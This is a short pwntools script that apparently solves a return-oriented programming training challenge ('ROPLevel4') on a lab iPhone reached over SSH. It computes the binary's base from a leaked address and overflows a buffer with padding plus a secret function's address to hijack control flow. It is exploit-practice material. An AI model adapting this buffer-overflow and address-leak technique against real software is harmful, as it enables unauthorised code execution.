from pwn import *
context.log_level = 'info'

HOST_iPhone = "192.168.10.2"
USER_iPhone = "pwn"

s = ssh(user = USER_iPhone, host = HOST_iPhone)

p = s.run("/var/pwn/work/Exploit-Challenges-master/rop/ROPLevel4/roplevel4")

offset_secret_func = 0xbd28 
offset_leakme_val = 0xc03c

addr_base = int(p.recvline()[7:-1], 16) - offset_leakme_val
log.info("addr_base = " + hex(addr_base))


addr_secret_func = addr_base + offset_secret_func



payload = b"A" * 0x18
payload += p32(addr_secret_func + 4)


p.sendline(payload)
p.interactive()
